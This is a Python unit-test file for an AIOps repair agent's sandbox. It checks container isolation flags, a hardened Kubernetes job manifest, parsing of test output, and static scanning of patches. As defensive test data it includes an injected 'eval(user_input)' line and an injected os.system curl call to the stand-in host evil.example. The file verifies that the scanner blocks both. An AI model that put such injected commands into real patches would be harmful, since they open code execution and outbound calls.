"""沙箱执行器单测（WP6）：隔离语义 / 输出解析 / 工作区准备 / K8s manifest / 真实容器集成。

运行：
    .venv/bin/python -m unittest discover -s tests -v

说明：真实容器集成类需要本机 docker 与 python:3.12-slim 镜像，不可用时自动跳过。
"""

from __future__ import annotations

import shutil
import subprocess
import tempfile
import unittest
from pathlib import Path
from unittest import mock

from aiops_agent import code_rag, fix_agent, sandbox
from aiops_agent.models import Alert, Patch, RootCause

ROOT_CAUSE = RootCause(
    error_type="NullPointerException",
    suspect_files=["com/example/service/OrderService.java"],
    confidence=0.95,
    summary="coupon 空值未防护。",
)


def _patch_for(alert_id: str = "wp6-s1", attempt: int = 0, *, bad: bool = False) -> Patch:
    """基于 demo-app 真实文件构造补丁（与修复 Agent 演示分支同源）。"""
    alert = Alert(alert_id=alert_id, service="order", description="沙箱单测")
    return fix_agent.fallback_patch(alert, ROOT_CAUSE, attempt, "order_service.py", bad=bad)


class TestScanPatchDiff(unittest.TestCase):
    def test_flags_dangerous_patterns(self) -> None:
        diff = "--- a/x.py\n+++ b/x.py\n@@ -1 +1 @@\n+result = eval(user_input)\n"
        ok, detail = sandbox.scan_patch_diff(diff)
        self.assertFalse(ok)
        self.assertIn("eval()", detail)

    def test_clean_diff_passes_and_counts_added(self) -> None:
        ok, detail = sandbox.scan_patch_diff(_patch_for().diff)
        self.assertTrue(ok, detail)
        self.assertIn("已扫描", detail)


class TestParseUnittestOutput(unittest.TestCase):
    OK_OUTPUT = (
        "test_a (t.T) ... ok\n"
        "----------------------------------------------------------------------\n"
        "Ran 6 tests in 0.003s\n"
        "\nOK\n"
    )
    FAILED_OUTPUT = (
        "test_a (t.T) ... ok\n"
        "======================================================================\n"
        "ERROR: test_submit_without_coupon_code (test_order_service.TestOrderService)\n"
        "----------------------------------------------------------------------\n"
        "Traceback (most recent call last):\n"
        '  File "/work/tests/test_order_service.py", line 23, in test_submit_without_coupon_code\n'
        '    result = self.service.submit({"amount": 100})\n'
        "TypeError: 'NoneType' object is not subscriptable\n"
        "\n"
        "----------------------------------------------------------------------\n"
        "Ran 6 tests in 0.004s\n"
        "\nFAILED (errors=1)\n"
    )

    def test_ok_output(self) -> None:
        parsed = sandbox.parse_unittest_output(self.OK_OUTPUT)
        self.assertEqual(parsed["tests_run"], 6)
        self.assertEqual(parsed["failed_tests"], [])
        self.assertEqual(parsed["error_summary"], "")

    def test_failed_output(self) -> None:
        parsed = sandbox.parse_unittest_output(self.FAILED_OUTPUT)
        self.assertEqual(parsed["tests_run"], 6)
        self.assertEqual(parsed["failed_tests"], ["test_submit_without_coupon_code"])
        self.assertIn("TypeError", parsed["error_summary"])


class TestDockerSandboxRunner(unittest.TestCase):
    def test_isolation_flags(self) -> None:
        job = sandbox.SandboxJob(patch_id="p1", workspace=Path("/tmp/ws"))
        cmd = sandbox.DockerSandboxRunner()._build_cmd(job)
        self.assertEqual(cmd[0], "docker")
        self.assertIn("--rm", cmd)
        self.assertEqual(cmd[cmd.index("--network") + 1], "none")  # 无出网权限
        self.assertIn("--read-only", cmd)
        self.assertEqual(cmd[cmd.index("--memory") + 1], "256m")
        self.assertEqual(cmd[cmd.index("--cpus") + 1], "1")
        self.assertEqual(cmd[cmd.index("--pids-limit") + 1], "128")
        self.assertTrue(any(str(part).endswith(":/work:ro") for part in cmd))  # 制品只读挂载

    def test_run_parses_completed_process(self) -> None:
        job = sandbox.SandboxJob(patch_id="p2", workspace=Path("/tmp/ws"))
        proc = mock.Mock(returncode=0, stdout=b"", stderr=b"...\nRan 6 tests in 0.002s\n\nOK\n")
        with mock.patch("aiops_agent.sandbox.subprocess.run", return_value=proc) as run:
            outcome = sandbox.DockerSandboxRunner().run(job)
        self.assertTrue(outcome.passed)
        self.assertEqual(outcome.tests_run, 6)
        self.assertEqual(outcome.exit_code, 0)
        args, kwargs = run.call_args
        self.assertIsInstance(args[0], list)  # 参数列表调用（shell=False）
        self.assertFalse(kwargs.get("shell", False))

    def test_run_timeout_marks_failed(self) -> None:
        job = sandbox.SandboxJob(patch_id="p3", workspace=Path("/tmp/ws"), timeout_seconds=1)
        expired = subprocess.TimeoutExpired(cmd="docker", timeout=1)
        with mock.patch("aiops_agent.sandbox.subprocess.run", side_effect=expired):
            outcome = sandbox.DockerSandboxRunner().run(job)
        self.assertTrue(outcome.timed_out)
        self.assertFalse(outcome.passed)


class TestK8sManifest(unittest.TestCase):
    def test_manifest_gvisor_and_hardening(self) -> None:
        job = sandbox.SandboxJob(patch_id="p4", workspace=Path("/tmp/ws"))
        manifest = sandbox.K8sJobSandboxRunner().render_manifest(job)
        spec = manifest["spec"]["template"]["spec"]
        self.assertEqual(spec["runtimeClassName"], "gvisor")  # 用户态内核隔离
        self.assertEqual(spec["restartPolicy"], "Never")
        self.assertFalse(spec["automountServiceAccountToken"])
        self.assertTrue(spec["securityContext"]["runAsNonRoot"])
        self.assertEqual(manifest["spec"]["backoffLimit"], 0)
        self.assertEqual(manifest["spec"]["activeDeadlineSeconds"], job.timeout_seconds)
        container = spec["containers"][0]
        self.assertTrue(container["securityContext"]["readOnlyRootFilesystem"])
        self.assertFalse(container["securityContext"]["allowPrivilegeEscalation"])
        self.assertEqual(container["securityContext"]["capabilities"]["drop"], ["ALL"])
        self.assertEqual(container["resources"]["limits"]["memory"], "256Mi")
        self.assertTrue(container["volumeMounts"][0]["readOnly"])


class TestPrepareWorkspaceAndRunTests(unittest.TestCase):
    def setUp(self) -> None:
        self.tmp = Path(tempfile.mkdtemp(prefix="wp6-sandbox-test-"))

    def tearDown(self) -> None:
        shutil.rmtree(self.tmp, ignore_errors=True)

    def test_prepare_workspace_applies_diff(self) -> None:
        patch = _patch_for("wp6-prep")
        workspace, error = sandbox.prepare_workspace(patch, code_rag.DEFAULT_REPO_DIR, self.tmp)
        self.assertEqual(error, "")
        self.assertIsNotNone(workspace)
        content = (workspace / "order_service.py").read_text(encoding="utf-8")
        self.assertIn('discount = coupon["discount"] if coupon else 0', content)
        self.assertTrue((workspace / "tests" / "test_order_service.py").is_file())
        self.assertFalse(any(p.name == "__pycache__" for p in workspace.rglob("__pycache__")))

    def test_prepare_workspace_bad_context_reports_error(self) -> None:
        patch = _patch_for("wp6-bad-context")
        patch.diff = patch.diff.replace("code = payload", "code = vanished")  # 破坏上下文
        workspace, error = sandbox.prepare_workspace(patch, code_rag.DEFAULT_REPO_DIR, self.tmp)
        self.assertIsNone(workspace)
        self.assertIn("无法应用", error)

    def test_run_patch_tests_maps_runner_outcome(self) -> None:
        patch = _patch_for("wp6-map")
        fake = mock.Mock()
        fake.run.return_value = sandbox.SandboxOutcome(
            exit_code=0,
            passed=True,
            tests_run=6,
            duration_seconds=0.5,
            runner="fake",
            image="python:3.12-slim",
        )
        report = sandbox.run_patch_tests(patch, 0, sandbox_root=self.tmp, runner=fake)
        self.assertTrue(report.passed)
        self.assertEqual(report.unit_tests, "6/6 passed")
        self.assertIn("demo-app/tests", report.regression_tests)
        job = fake.run.call_args[0][0]
        self.assertIsInstance(job, sandbox.SandboxJob)
        self.assertTrue((job.workspace / "order_service.py").is_file())

    def test_run_patch_tests_reports_failure_details(self) -> None:
        patch = _patch_for("wp6-fail", bad=True)
        fake = mock.Mock()
        fake.run.return_value = sandbox.SandboxOutcome(
            exit_code=1,
            passed=False,
            tests_run=6,
            duration_seconds=0.4,
            runner="fake",
            image="python:3.12-slim",
            failed_tests=["test_submit_without_coupon_code"],
            error_summary="TypeError: 'NoneType' object is not subscriptable",
        )
        report = sandbox.run_patch_tests(patch, 0, sandbox_root=self.tmp, runner=fake)
        self.assertFalse(report.passed)
        self.assertIn("5/6 passed", report.unit_tests)
        self.assertIn("test_submit_without_coupon_code", report.details)
        self.assertIn("TypeError", report.details)

    def test_run_patch_tests_sast_blocks_before_execution(self) -> None:
        patch = _patch_for("wp6-sast")
        patch.diff += "+os.system('curl http://evil.example')\n"
        runner = mock.Mock()
        report = sandbox.run_patch_tests(patch, 0, sandbox_root=self.tmp, runner=runner)
        self.assertFalse(report.passed)
        self.assertIn("SAST", report.unit_tests)
        runner.run.assert_not_called()


def _docker_available() -> bool:
    if not shutil.which("docker"):
        return False
    try:
        probe = subprocess.run(
            ["docker", "image", "inspect", sandbox.SANDBOX_IMAGE],
            capture_output=True,
            timeout=20,
        )
    except OSError:
        return False
    return probe.returncode == 0


@unittest.skipUnless(_docker_available(), "docker/镜像不可用，跳过真实容器集成")
class TestRealContainerIntegration(unittest.TestCase):
    """真实隔离容器执行：修复候选通过 / 错误候选被拦截 / 无出网权限。"""

    def test_good_patch_passes_and_bad_patch_blocked(self) -> None:
        good = _patch_for("wp6-int-good", bad=False)
        report = sandbox.run_patch_tests(good, 0)
        self.assertTrue(report.passed, report.details)
        self.assertEqual(report.unit_tests, "6/6 passed")

        bad = _patch_for("wp6-int-bad", bad=True)
        bad_report = sandbox.run_patch_tests(bad, 0)
        self.assertFalse(bad_report.passed)
        self.assertIn("test_submit_without_coupon_code", bad_report.details)
        self.assertIn("TypeError", bad_report.details)

    def test_network_is_disabled_in_container(self) -> None:
        job = sandbox.SandboxJob(
            patch_id="wp6-int-net",
            workspace=code_rag.DEFAULT_REPO_DIR,
            command=[
                "python",
                "-c",
                "import socket; socket.create_connection(('1.1.1.1', 53), 2)",
            ],
        )
        outcome = sandbox.DockerSandboxRunner().run(job)
        self.assertFalse(outcome.passed)
        self.assertNotEqual(outcome.exit_code, 0)


if __name__ == "__main__":
    unittest.main()
